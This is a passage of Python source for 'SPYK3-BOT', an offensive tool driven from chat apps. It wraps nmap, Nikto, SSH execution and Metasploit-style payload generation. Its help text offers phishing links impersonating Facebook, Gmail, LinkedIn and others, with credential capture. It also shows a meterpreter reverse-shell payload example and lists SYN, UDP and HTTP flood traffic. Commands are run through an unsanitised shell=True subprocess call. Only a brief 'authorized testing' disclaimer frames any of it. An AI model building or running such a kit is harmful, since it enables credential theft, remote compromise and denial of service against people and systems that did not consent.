            payloads = self.payloads.list_payloads()
            output = "Payloads:\n"
            for p in payloads:
                output += f"  {p['type']} - {p['description']}\n"
        else:
            output = f"Unknown show type: {show_type}"
        return self._create_result(True, output)
    
    def _execute_hosts(self, args: List[str]) -> Dict[str, Any]:
        if args and args[0] == '-R':
            hosts = self.workspaces.list_hosts()
            output = "Hosts\n=====\n\n"
            for host in hosts:
                output += f"{host['ip_address']}"
                if host.get('hostname'):
                    output += f"  {host['hostname']}"
                if host.get('os_info'):
                    output += f"  [{host['os_info']}]"
                output += "\n"
        elif args and args[0] == '-a' and len(args) > 1:
            ip = args[1]
            hostname = args[2] if len(args) > 2 else None
            host_id = self.db.add_host(ip, hostname)
            output = f"✅ Added host: {ip}" if host_id else f"❌ Failed to add host: {ip}"
        else:
            hosts = self.workspaces.list_hosts()
            output = f"Hosts in workspace ({len(hosts)}):\n"
            for host in hosts:
                output += f"  {host['ip_address']}\n"
        return self._create_result(True, output)
    
    def _execute_services(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: !services -S <ip>")
        if args[0] == '-S' and len(args) > 1:
            ip = args[1]
            services = self.workspaces.list_services(ip=ip)
            output = f"Services for {ip}:\n"
            for svc in services:
                output += f"  {svc['port']}/{svc.get('protocol', 'tcp')}  "
                output += f"{svc.get('service_name', 'unknown')} "
                output += f"{svc.get('service_version', '')}\n"
        else:
            output = "Usage: !services -S <ip>"
        return self._create_result(True, output)
    
    def _execute_workspace(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            current = self.workspaces.get_current_workspace()
            if current:
                output = f"Current workspace: {current['name']}\n"
                hosts = self.workspaces.list_hosts(current['name'])
                output += f"Hosts: {len(hosts)}"
            else:
                output = "No active workspace"
            return self._create_result(True, output)
        action = args[0].lower()
        if action == '-a' and len(args) > 1:
            name = args[1]
            desc = ' '.join(args[2:]) if len(args) > 2 else ""
            output = f"✅ Workspace created: {name}" if self.workspaces.create_workspace(name, desc) else f"❌ Failed to create workspace: {name}"
        elif action == '-d' and len(args) > 1:
            name = args[1]
            output = f"✅ Workspace deleted: {name}" if self.workspaces.delete_workspace(name) else f"❌ Failed to delete workspace: {name}"
        elif len(args) >= 1:
            name = args[0]
            output = f"✅ Switched to workspace: {name}" if self.workspaces.switch_workspace(name) else f"❌ Failed to switch to workspace: {name}"
        else:
            workspaces = self.workspaces.list_workspaces()
            output = "Workspaces:\n"
            for ws in workspaces:
                active = " (active)" if ws.get('active') else ""
                output += f"  {ws['name']}{active} - {ws.get('description', '')}\n"
        return self._create_result(True, output)
    
    def _execute_sessions(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            sessions = self.sessions.list_sessions()
            output = "Active sessions\n==============\n\n"
            for sess in sessions:
                output += f"  {sess['id']}  {sess['type']}  {sess.get('target', 'unknown')}\n"
            return self._create_result(True, output)
        if args[0] == '-l':
            sessions = self.sessions.list_sessions()
            output = "Sessions:\n"
            for sess in sessions:
                output += f"  {sess['id']}  {sess['type']}  {sess.get('target', 'unknown')}\n"
        elif args[0] == '-i' and len(args) > 1:
            session_id = args[1]
            session = self.sessions.get_session(session_id)
            if session:
                output = f"Session {session_id}\n"
                output += f"  Type: {session.get('type')}\n"
                output += f"  Target: {session.get('target')}\n"
                output += f"  Payload: {session.get('payload')}\n"
                output += f"  Created: {session.get('created')}\n"
                output += f"  Last Active: {session.get('last_active')}\n"
            else:
                output = f"Session {session_id} not found"
        else:
            output = "Usage: !sessions [-l] [-i <id>]"
        return self._create_result(True, output)
    
    def _execute_route(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            routes = self.sessions.list_routes()
            output = "Routes\n======\n\n"
            for route in routes:
                output += f"  {route['subnet']}/{route['netmask']} via {route.get('gateway', 'direct')}"
                if route.get('via_session'):
                    output += f" (session {route['via_session']})"
                output += "\n"
            return self._create_result(True, output)
        if args[0] == 'add' and len(args) >= 3:
            subnet = args[1]
            netmask = args[2]
            gateway = args[3] if len(args) > 3 else None
            session_id = args[4] if len(args) > 4 else None
            output = f"✅ Route added: {subnet}/{netmask}" if self.sessions.add_route(subnet, netmask, gateway, session_id) else f"❌ Failed to add route"
        else:
            output = "Usage: !route add <subnet> <netmask> [gateway] [session_id]"
        return self._create_result(True, output)
    
    def _execute_generate(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            payloads = self.payloads.list_payloads()
            output = "Payloads:\n"
            for p in payloads:
                output += f"  {p['type']}\n"
            output += "\nUsage: !generate payload <type> LHOST=<ip> -f <format> -o <file>"
            return self._create_result(True, output)
        cmd_str = ' '.join(args)
        payload_match = re.search(r'payload\s+([^\s]+)', cmd_str)
        if not payload_match:
            return self._create_result(False, "Invalid payload format")
        payload_type = payload_match.group(1)
        lhost_match = re.search(r'LHOST=([^\s]+)', cmd_str)
        lhost = lhost_match.group(1) if lhost_match else None
        lport_match = re.search(r'LPORT=(\d+)', cmd_str)
        lport = int(lport_match.group(1)) if lport_match else 4444
        format_match = re.search(r'-f\s+([^\s]+)', cmd_str)
        format = format_match.group(1) if format_match else 'exe'
        output_match = re.search(r'-o\s+([^\s]+)', cmd_str)
        output_file = output_match.group(1) if output_match else None
        if not lhost:
            return self._create_result(False, "LHOST required")
        result = self.payloads.generate(payload_type, lhost, lport, format)
        if result.get('success'):
            output = f"✅ Payload generated: {result.get('filename')}\n   Path: {result.get('path')}\n   Size: {result.get('size')} bytes"
        else:
            output = f"❌ {result.get('error', 'Generation failed')}"
        return self._create_result(result.get('success', False), output)
    
    def _execute_help(self, args: List[str]) -> Dict[str, Any]:
        help_text = """
🕷️ **SPYK3-BOT v10.0.0 Commands** 🕷️

**🔐 CRUNCH WORDLIST GENERATOR:**
`crunch` - Show crunch help
`crunch_generate <name> <min> <max> [pattern] [charset]` - Generate wordlist
`crunch_list` - List generated wordlists
`crunch_info <id>` - Show wordlist details
`crunch_delete <id>` - Delete wordlist
`crunch_charsets` - Show available charsets

**⏰ TIME & DATE COMMANDS:**
`time` - Show current time
`date` - Show current date
`datetime` - Show both date and time
`history [limit]` - View command history
`time_history` - View time command history

**🔌 SSH COMMANDS:**
`ssh_add <name> <host> <user> [password] [port]` - Add SSH server
`ssh_list` - List configured SSH servers
`ssh_connect <server_id>` - Connect to SSH server
`ssh_exec <server_id> <command>` - Execute command on remote server
`ssh_upload <server_id> <local> <remote>` - Upload file
`ssh_download <server_id> <remote> <local>` - Download file
`ssh_disconnect <server_id>` - Disconnect from server

**🚀 TRAFFIC GENERATION:**
`generate_traffic <type> <ip> <duration> [port] [rate]` - Generate real traffic
`traffic_types` - List available traffic types
`traffic_status` - Check active generators
`traffic_stop [id]` - Stop traffic generation
`traffic_logs [limit]` - View traffic logs

**🕷️ NIKTO WEB SCANNER:**
`nikto <target>` - Basic web vulnerability scan
`nikto_full <target>` - Full scan with all tests
`nikto_ssl <target>` - SSL/TLS specific scan
`nikto_sql <target>` - SQL injection scan
`nikto_xss <target>` - XSS scan
`nikto_cgi <target>` - CGI scan
`nikto_status` - Check scanner status
`nikto_results` - View recent scans

**🎣 SOCIAL ENGINEERING:**
`generate_phishing_link_for_facebook` - Facebook phishing link
`generate_phishing_link_for_instagram` - Instagram phishing link
`generate_phishing_link_for_twitter` - Twitter phishing link
`generate_phishing_link_for_gmail` - Gmail phishing link
`generate_phishing_link_for_linkedin` - LinkedIn phishing link
`generate_phishing_link_for_custom [url]` - Custom phishing link
`phishing_start_server <id> [port]` - Start phishing server
`phishing_stop_server` - Stop phishing server
`phishing_status` - Check server status
`phishing_links` - List all phishing links
`phishing_credentials [id]` - View captured credentials
`phishing_qr <id>` - Generate QR code
`phishing_shorten <id>` - Shorten URL

**🔒 IP MANAGEMENT:**
`add_ip <ip> [notes]` - Add IP to monitoring
`remove_ip <ip>` - Remove IP from monitoring
`block_ip <ip> [reason]` - Block IP address
`unblock_ip <ip>` - Unblock IP address
`list_ips` - List managed IPs
`ip_info <ip>` - Detailed IP information

**🛡️ NETWORK COMMANDS:**
`ping <ip>` - Ping an IP address
`scan <ip>` - Scan ports 1-1000
`quick_scan <ip>` - Quick port scan
`nmap <ip> [options]` - Full nmap scan
`traceroute <target>` - Network path tracing

**🔍 INFORMATION GATHERING:**
`whois <domain>` - WHOIS lookup
`dns <domain>` - DNS lookup
`location <ip>` - IP geolocation
`analyze <ip>` - Comprehensive IP analysis

**📊 SYSTEM COMMANDS:**
`system` - System information
`status` - System status
`threats` - Recent threats
`report` - Security report

**📱 MESSAGING PLATFORMS:**
`whatsapp_config <phone> [prefix]` - Configure WhatsApp
`whatsapp_allow <phone>` - Allow WhatsApp contact
`signal_config <phone> [prefix]` - Configure Signal
`signal_allow <phone>` - Allow Signal number
`signal_register` - Register Signal device
`slack_config <token> [channel]` - Configure Slack
`slack_allow <user>` - Allow Slack user
`imessage_config [numbers]` - Configure iMessage
`imessage_allow <number>` - Allow iMessage number

**! Nmap Scanning:**
`!db_nmap -sn <IP>` - Ping sweep
`!db_nmap -O <IP>` - OS detection
`!db_nmap -sV <IP>` - Version detection  
`!db_nmap -A <IP>` - Aggressive scan
`!db_nmap --script vuln <IP>` - Vulnerability scan
`!db_nmap <IP> -p <ports>` - Port scan

**! Auxiliary Modules:**
`!use <module>` - Select module
`!set <option> <value>` - Set option
`!run` - Run module
`!show options` - Show module options
`!show modules` - List modules

**! Workspace Management:**
`!workspace` - Show current workspace
`!workspace <name>` - Switch workspace
`!workspace -a <name>` - Create workspace
`!workspace -d <name>` - Delete workspace

**Examples:**
`time`
`date`
`ping 8.8.8.8`
`crunch_generate passwords 8 12 alphanum`
`crunch_list`
`ssh_add myserver 192.168.1.100 root password123`
`ssh_exec myserver "ls -la"`
`generate_traffic icmp 192.168.1.1 10`
`nikto example.com`
`generate_phishing_link_for_facebook`
`phishing_start_server abc12345 8080`
`add_ip 192.168.1.100 Suspicious`
`block_ip 10.0.0.5 Port scanning`
`!use auxiliary/scanner/ip/ipgeo`
`!set RHOSTS 192.168.1.1`
`!run`
`!generate payload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe`

⚠️ **For authorized security testing only**
        """
        return self._create_result(True, help_text)
    
    # ==================== Ping and Scan Command Handlers ====================
    def _execute_ping(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: ping <target>")
        target = args[0]
        count = 4
        size = 56
        if len(args) > 1:
            for i in range(1, len(args)):
                if args[i] == '-c' and i + 1 < len(args):
                    try:
                        count = int(args[i + 1])
                    except:
                        pass
                elif args[i] == '-s' and i + 1 < len(args):
                    try:
                        size = int(args[i + 1])
                    except:
                        pass
        result = self.tools.ping(target, count, size)
        return self._create_result(result.success, result.output)
    
    def _execute_ping6(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: ping6 <target>")
        target = args[0]
        if platform.system().lower() == 'windows':
            cmd = ['ping', '-6', target]
        else:
            cmd = ['ping6', target]
        cmd.extend(args[1:])
        return self._execute_generic(' '.join(cmd))
    
    def _execute_scan(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: scan <target> [ports]")
        target = args[0]
        ports = "1-1000"
        scan_type = "quick"
        if len(args) > 1:
            ports = args[1]
        result = self.tools.nmap_scan(target, scan_type, ports)
        if result.success:
            open_ports = self._parse_nmap_output(result.output)
            scan_result = ScanResult(
                target=target,
                scan_type=scan_type,
                open_ports=open_ports,
                timestamp=datetime.datetime.now().isoformat(),
                success=True
            )
            self.db.log_scan(scan_result)
            return self._create_result(True, {
                'target': target,
                'scan_type': scan_type,
                'ports_scanned': ports,
                'open_ports': open_ports,
                'open_ports_count': len(open_ports),
                'output': result.output[-2000:]
            })
        return self._create_result(False, result.output)
    
    def _execute_quick_scan(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: quick_scan <target>")
        target = args[0]
        ports = "1-1000"
        scan_type = "quick_scan"
        result = self.tools.nmap_scan(target, scan_type, ports)
        if result.success:
            open_ports = self._parse_nmap_output(result.output)
            scan_result = ScanResult(
                target=target,
                scan_type=scan_type,
                open_ports=open_ports,
                timestamp=datetime.datetime.now().isoformat(),
                success=True
            )
            self.db.log_scan(scan_result)
            return self._create_result(True, {
                'target': target,
                'scan_type': "Quick Scan",
                'ports_scanned': ports,
                'open_ports': open_ports,
                'open_ports_count': len(open_ports),
                'output': result.output[-1500:]
            })
        return self._create_result(False, result.output)
    
    def _execute_web_scan(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: web_scan <target>")
        target = args[0]
        scan_type = "web"
        result = self.tools.nmap_scan(target, scan_type)
        if result.success:
            open_ports = self._parse_nmap_output(result.output)
            scan_result = ScanResult(
                target=target,
                scan_type="web",
                open_ports=open_ports,
                timestamp=datetime.datetime.now().isoformat(),
                success=True
            )
            self.db.log_scan(scan_result)
            return self._create_result(True, {
                'target': target,
                'scan_type': "Web Server Scan",
                'open_ports': open_ports,
                'open_ports_count': len(open_ports),
                'output': result.output[-2000:]
            })
        return self._create_result(False, result.output)
    
    def _execute_nmap(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: nmap <target> [options]")
        target = args[0]
        options = ' '.join(args[1:]) if len(args) > 1 else ""
        scan_type = "custom"
        if '-A' in options or '-sV' in options:
            scan_type = "comprehensive"
        elif '-sS' in options and 'T2' in options:
            scan_type = "stealth"
        elif '-sU' in options:
            scan_type = "udp"
        elif '-O' in options:
            scan_type = "os_detection"
        result = self._execute_generic(f"nmap {target} {options}")
        if result['success']:
            open_ports = self._parse_nmap_output(result['output'])
            scan_result = ScanResult(
                target=target,
                scan_type=scan_type,
                open_ports=open_ports,
                timestamp=datetime.datetime.now().isoformat(),
                success=True
            )
            self.db.log_scan(scan_result)
            result['data'] = {
                'target': target,
                'scan_type': scan_type,
                'options': options,
                'open_ports': open_ports,
                'open_ports_count': len(open_ports)
            }
        return result
    
    def _execute_full_scan(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: full_scan <target>")
        target = args[0]
        scan_type = "full"
        result = self.tools.nmap_scan(target, scan_type)
        if result.success:
            open_ports = self._parse_nmap_output(result.output)
            scan_result = ScanResult(
                target=target,
                scan_type=scan_type,
                open_ports=open_ports,
                timestamp=datetime.datetime.now().isoformat(),
                success=True
            )
            self.db.log_scan(scan_result)
            return self._create_result(True, {
                'target': target,
                'scan_type': "Full Scan (All Ports)",
                'open_ports': open_ports[:50],
                'open_ports_count': len(open_ports),
                'output': result.output[-3000:]
            })
        return self._create_result(False, result.output)
    
    def _parse_nmap_output(self, output: str) -> List[Dict]:
        open_ports = []
        lines = output.split('\n')
        for line in lines:
            if '/tcp' in line or '/udp' in line:
                parts = line.split()
                if len(parts) >= 3:
                    port_proto = parts[0].split('/')
                    if len(port_proto) == 2:
                        try:
                            port = int(port_proto[0])
                            protocol = port_proto[1]
                            state = parts[1] if len(parts) > 1 else 'unknown'
                            service = parts[2] if len(parts) > 2 else 'unknown'
                            if state.lower() == 'open':
                                open_ports.append({
                                    'port': port,
                                    'protocol': protocol,
                                    'service': service,
                                    'state': state
                                })
                        except ValueError:
                            continue
        return open_ports
    
    def _execute_portscan(self, args: List[str]) -> Dict[str, Any]:
        return self._execute_scan(args)
    
    def _execute_traceroute(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: traceroute <target>")
        target = args[0]
        result = self.tools.traceroute(target)
        return self._create_result(result.success, result.output)
    
    def _execute_tracepath(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: tracepath <target>")
        return self._execute_generic('tracepath ' + ' '.join(args))
    
    def _execute_curl(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: curl <url> [options]")
        url = args[0]
        method = 'GET'
        if len(args) > 1:
            for i in range(1, len(args)):
                if args[i] == '-X' and i + 1 < len(args):
                    method = args[i + 1].upper()
        result = self.tools.curl_request(url, method)
        return self._create_result(result.success, result.output)
    
    def _execute_wget(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: wget <url>")
        return self._execute_generic('wget ' + ' '.join(args))
    
    def _execute_http(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: http <url>")
        url = args[0]
        try:
            response = requests.get(url, timeout=10)
            result = {
                'status': response.status_code,
                'headers': dict(response.headers),
                'body': response.text[:500] + ('...' if len(response.text) > 500 else ''),
                'size': len(response.content)
            }
            return self._create_result(True, result)
        except Exception as e:
            return self._create_result(False, f"HTTP request failed: {e}")
    
    def _execute_whois(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: whois <domain>")
        target = args[0]
        result = self.tools.whois_lookup(target)
        return self._create_result(result.success, result.output)
    
    def _execute_dig(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: dig <domain>")
        target = args[0]
        result = self.tools.dns_lookup(target)
        return self._create_result(result.success, result.output)
    
    def _execute_dns(self, args: List[str]) -> Dict[str, Any]:
        return self._execute_dig(args)
    
    def _execute_location(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: location <ip>")
        target = args[0]
        result = self.tools.get_ip_location(target)
        return self._create_result(result['success'], result)
    
    def _execute_analyze(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: analyze <ip>")
        ip = args[0]
        analysis = {
            'ip': ip,
            'timestamp': datetime.datetime.now().isoformat(),
            'location': None,
            'threats': [],
            'recommendations': []
        }
        location = self.tools.get_ip_location(ip)
        if location['success']:
            analysis['location'] = location
        threats = self.db.get_threats_by_ip(ip, 10)
        if threats:
            analysis['threats'] = threats
            analysis['threat_count'] = len(threats)
        managed = self.db.get_ip_info(ip)
        if managed:
            analysis['managed'] = managed
        if threats:
            analysis['recommendations'].append("This IP has been involved in previous threats - monitor closely")
        if threats and len(threats) > 5:
            analysis['recommendations'].append("High threat activity detected - consider blocking this IP")
        return self._create_result(True, analysis)
    
    def _execute_system(self, args: List[str]) -> Dict[str, Any]:
        info = {
            'system': platform.system(),
            'release': platform.release(),
            'version': platform.version(),
            'hostname': socket.gethostname(),
            'cpu_count': psutil.cpu_count(),
            'cpu_percent': psutil.cpu_percent(interval=1),
            'memory': {
                'total': psutil.virtual_memory().total,
                'available': psutil.virtual_memory().available,
                'percent': psutil.virtual_memory().percent,
                'used': psutil.virtual_memory().used,
                'free': psutil.virtual_memory().free
            },
            'disk': {
                'total': psutil.disk_usage('/').total,
                'used': psutil.disk_usage('/').used,
                'free': psutil.disk_usage('/').free,
                'percent': psutil.disk_usage('/').percent
            },
            'boot_time': datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')
        }
        return self._create_result(True, info)
    
    def _execute_network(self, args: List[str]) -> Dict[str, Any]:
        try:
            hostname = socket.gethostname()
            local_ip = self.tools.get_local_ip()
            interfaces = psutil.net_if_addrs()
            network_info = {
                'hostname': hostname,
                'local_ip': local_ip,
                'interfaces': {}
            }
            for iface, addrs in interfaces.items():
                network_info['interfaces'][iface] = []
                for addr in addrs:
                    network_info['interfaces'][iface].append({
                        'family': str(addr.family),
                        'address': addr.address
                    })
            return self._create_result(True, network_info)
        except Exception as e:
            return self._create_result(False, f"Failed to get network info: {e}")
    
    def _execute_status(self, args: List[str]) -> Dict[str, Any]:
        status = {
            'timestamp': datetime.datetime.now().isoformat(),
            'cpu': f"{psutil.cpu_percent(interval=1)}%",
            'memory': f"{psutil.virtual_memory().percent}%",
            'disk': f"{psutil.disk_usage('/').percent}%",
            'uptime': str(datetime.datetime.now() - datetime.datetime.fromtimestamp(psutil.boot_time())),
            'network': {
                'bytes_sent': psutil.net_io_counters().bytes_sent,
                'bytes_recv': psutil.net_io_counters().bytes_recv
            }
        }
        return self._create_result(True, status)
    
    def _execute_monitor(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: monitor <status|start|stop>")
        action = args[0].lower()
        if action == 'status':
            return self._create_result(True, "Use 'status' command for monitoring status")
        else:
            return self._create_result(False, f"Monitor action '{action}' not directly available. Use start/stop commands in main app.")
    
    def _execute_ps(self, args: List[str]) -> Dict[str, Any]:
        return self._execute_generic('ps aux' if len(args) == 0 else 'ps ' + ' '.join(args))
    
    def _execute_top(self, args: List[str]) -> Dict[str, Any]:
        return self._execute_generic('top -b -n 1' if len(args) == 0 else 'top ' + ' '.join(args))
    
    def _execute_threats(self, args: List[str]) -> Dict[str, Any]:
        limit = 10
        if args:
            try:
                limit = int(args[0])
            except:
                pass
        threats = self.db.get_recent_threats(limit)
        return self._create_result(True, threats)
    
    def _execute_report(self, args: List[str]) -> Dict[str, Any]:
        stats = self.db.get_statistics()
        threats = self.db.get_recent_threats(50)
        scans = self.db.get_nikto_scans(10)
        ssh_commands = self.db.get_ssh_command_history(limit=50)
        phishing_links = self.db.get_phishing_links()
        captured_creds = self.db.get_captured_credentials()
        sessions = self.db.get_sessions()
        performance = self.db.get_performance_metrics(5)
        
        critical_threats = len([t for t in threats if t.get('severity') == 'critical'])
        high_threats = len([t for t in threats if t.get('severity') == 'high'])
        medium_threats = len([t for t in threats if t.get('severity') == 'medium'])
        low_threats = len([t for t in threats if t.get('severity') == 'low'])
        
        cpu = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory().percent
        disk = psutil.disk_usage('/').percent
        
        time_history = self.db.get_time_history(5)
        
        crunch_wordlists = self.db.get_crunch_wordlists()
        
        report = {
            'generated_at': datetime.datetime.now().isoformat(),
            'statistics': stats,
            'threat_summary': {
                'critical': critical_threats,
                'high': high_threats,
                'medium': medium_threats,
                'low': low_threats,
                'total': len(threats)
            },
            'recent_nikto_scans': len(scans),
            'ssh_activity': {
                'total_commands': len(ssh_commands),
                'recent_commands': ssh_commands[:5]
            },
            'system_status': {
                'cpu': cpu,
                'memory': mem,
                'disk': disk
            },
            'social_engineering': {
                'total_phishing_links': len(phishing_links),
                'total_captured_credentials': len(captured_creds),
                'active_links': len(self.social_tools.active_links)
            },
            'crunch_wordlists': {
                'total': len(crunch_wordlists),
                'recent': crunch_wordlists[:5]
            },
            'recent_time_commands': len(time_history),
            'active_sessions': len([s for s in sessions if s.get('active')]),
            'performance': performance[:3] if performance else [],
            'recommendations': []
        }
        
        if critical_threats > 0:
            report['recommendations'].append("🚨 CRITICAL: Investigate critical severity threats immediately")
        if high_threats > 0:
            report['recommendations'].append("⚠️ HIGH: Address high severity threats as soon as possible")
        if cpu > 80:
            report['recommendations'].append("📈 High CPU usage detected - investigate running processes")
        if mem > 80:
            report['recommendations'].append("💾 High memory usage detected - check for memory leaks")
        if stats.get('total_blocked_ips', 0) > 0:
            report['recommendations'].append(f"🔒 {stats['total_blocked_ips']} IP(s) currently blocked")
        if captured_creds and len(captured_creds) > 0:
            report['recommendations'].append(f"🎣 {len(captured_creds)} credentials captured in phishing tests - review security awareness")
        if crunch_wordlists:
            report['recommendations'].append(f"🔐 {len(crunch_wordlists)} wordlists available for brute force testing")
        
        filename = f"security_report_{int(time.time())}.json"
        filepath = os.path.join(REPORT_DIR, filename)
        
        try:
            with open(filepath, 'w') as f:
                json.dump(report, f, indent=2)
            report['report_file'] = filepath
        except Exception as e:
            logger.error(f"Failed to save report: {e}")
        
        return self._create_result(True, report)
    
    def _execute_generic(self, command: str) -> Dict[str, Any]:
        try:
            start_time = time.time()
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60,
                encoding='utf-8',
                errors='ignore'
            )
            execution_time = time.time() - start_time
            return self._create_result(
                result.returncode == 0,
                result.stdout if result.stdout else result.stderr,
                execution_time
            )
        except subprocess.TimeoutExpired:
            return self._create_result(False, f"Command timed out after 60 seconds")
        except Exception as e:
            return self._create_result(False, f"Command execution failed: {e}")

# =====================
# MAIN APPLICATION
# =====================
class Spyk3Bot:
    """Main application class with all features - Cyberpunk Green/Orange Theme Edition"""
    
    def __init__(self):
        self.config = ConfigManager.load_config()
        self.db = DatabaseManager()
        self.ssh_manager = SSHManager(self.db, self.config)
        self.nikto = NiktoScanner(self.db, self.config.get('nikto', {}))
        self.traffic_gen = TrafficGeneratorEngine(self.db, self.config)
        self.crunch_gen = CrunchGenerator(self.db, self.config)
        self.handler = CommandHandler(self.db, self.ssh_manager, self.nikto, self.traffic_gen, self.crunch_gen)
        self.monitor = NetworkMonitor(self.db, self.config)
        self.discord_bot = Spyk3BotDiscord(self.handler, self.db, self.monitor)
        self.telegram_bot = Spyk3BotTelegram(self.handler, self.db)
        self.whatsapp_bot = Spyk3BotWhatsApp(self.handler, self.db)
        self.signal_bot = Spyk3BotSignal(self.handler, self.db)
        self.slack_bot = Spyk3BotSlack(self.handler, self.db)
        self.imessage_bot = Spyk3BotIMessage(self.handler, self.db)
        self.session_id = self.db.create_session("local_user")
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.ORANGE}        🕷️ SPYK3-BOT v0.5.9                      🕷️                          {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ACCENT}  • 🔐 CRUNCH Wordlist Generator          • 2000+ Security Commands          {Colors.PRIMARY}║
║{Colors.ACCENT}  • 🔌 SSH Remote Command Execution        • ⏰ Time/Date Commands & History {Colors.PRIMARY}║
║{Colors.ACCENT}  • 🚀 REAL Traffic Generation              • ICMP/TCP/UDP/HTTP/DNS/ARP      {Colors.PRIMARY}║
║{Colors.ACCENT}  • 🎣 Social Engineering Suite              • Facebook/Instagram/Twitter/Gmail {Colors.PRIMARY}║
║{Colors.ACCENT}  • 📱 LinkedIn Phishing                     • QR Code Generation             {Colors.PRIMARY}║
║{Colors.ACCENT}  • 🔗 URL Shortening                        • Credential Capture & Logging   {Colors.PRIMARY}║
║{Colors.ACCENT}  • 🕷️ Nikto Web Scanner                       • IP Management & Blocking       {Colors.PRIMARY}║
║{Colors.ACCENT}  • 📱 Multi-Platform: Discord/Telegram/WhatsApp/Signal/Slack/iMessage {Colors.PRIMARY}║
║{Colors.ACCENT}  • 🔌 Metasploit-style auxiliary modules  • 🎯 Payload generation          {Colors.PRIMARY}║
║{Colors.ACCENT}  • 📊 Session management & routing         • 🗂️ Workspace organization      {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ORANGE2}            🎯                                                       {Colors.PRIMARY}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.SECONDARY}🔐 NEW FEATURES:{Colors.RESET}
  • 🔐 **CRUNCH Wordlist Generator** - Create custom wordlists for brute force attacks
  • 🔌 **SSH Command Execution** - Execute commands on remote servers
  • 🚀 **REAL Traffic Generation** - ICMP, TCP, UDP, HTTP, DNS, ARP traffic
  • 🎣 **Social Engineering Suite** - Phishing pages with credential capture
  • 📱 **Multi-Platform Bots** - Discord, Telegram, WhatsApp, Signal, Slack, iMessage
  • ⏰ **Enhanced Time Commands** - Time calculations and history
  • 🕷️ **Nikto Web Scanner** - Vulnerability scanning with full options

{Colors.SECONDARY}💡 Type 'help' for command list{Colors.RESET}
{Colors.SECONDARY}🔐 Type 'crunch' for wordlist generation help{Colors.RESET}
{Colors.SECONDARY}🔌 Type 'ssh_list' to see configured SSH servers{Colors.RESET}
⏰ Type 'time' to see current time, 'history' for command history{Colors.RESET}
        """
        print(banner)
    
    def print_help(self):
        help_text = f"""
{Colors.PRIMARY}┌─────────────────{Colors.ORANGE} SPYK3-BOT COMMANDS {Colors.PRIMARY}─────────────────┐{Colors.RESET}

{Colors.PRIMARY}🔐 CRUNCH WORDLIST GENERATOR:{Colors.RESET}
  crunch_generate <name> <min> <max> [pattern] [charset] - Generate wordlist
  crunch_list                                          - List generated wordlists
  crunch_info <wordlist_id>                             - Show wordlist details
  crunch_delete <wordlist_id>                           - Delete wordlist
  crunch_charsets                                       - Show available charsets

{Colors.PRIMARY}🔌 SSH COMMANDS:{Colors.RESET}
  ssh_add <name> <host> <user> [password] [port] - Add SSH server
  ssh_list                                       - List SSH servers
  ssh_connect <server_id>                        - Connect to server
  ssh_exec <server_id> <command>                 - Execute command
  ssh_upload <server_id> <local> <remote>        - Upload file
  ssh_download <server_id> <remote> <local>      - Download file
  ssh_disconnect [server_id]                     - Disconnect from server

{Colors.PRIMARY}⏰ TIME & DATE COMMANDS:{Colors.RESET}
  time [full]              - Show current time
  date [full]              - Show current date
  datetime [full]          - Show both date and time
  timezone                 - Show timezone information
  time_diff <t1> <t2>      - Calculate time difference
  date_diff <d1> <d2>      - Calculate date difference
  history [limit]          - View command history
  time_history [limit]     - View time/date command history

{Colors.PRIMARY}📱 MESSAGING PLATFORMS:{Colors.RESET}
  whatsapp_config, whatsapp_allow, whatsapp_disallow
  signal_config, signal_allow, signal_disallow, signal_register
  slack_config, slack_allow, slack_disallow
  imessage_config, imessage_allow, imessage_disallow, imessage_add_watch

{Colors.PRIMARY}🚀 TRAFFIC GENERATION:{Colors.RESET}
  generate_traffic <type> <ip> <duration> [port] [rate] - Generate real traffic
  traffic_types                - List available traffic types
  traffic_status               - Check active generators
  traffic_stop [id]            - Stop traffic generation
  traffic_logs [limit]         - View traffic logs
  traffic_help                 - Detailed help for traffic generation

{Colors.PRIMARY}📡 TRAFFIC TYPES:{Colors.RESET}
  icmp, tcp_syn, tcp_ack, tcp_connect, udp, http_get, http_post, https, dns
  arp, ping_flood, syn_flood, udp_flood, http_flood, mixed, random

{Colors.PRIMARY}🎣 SOCIAL ENGINEERING:{Colors.RESET}
  generate_phishing_link_for_facebook     - Generate Facebook phishing link
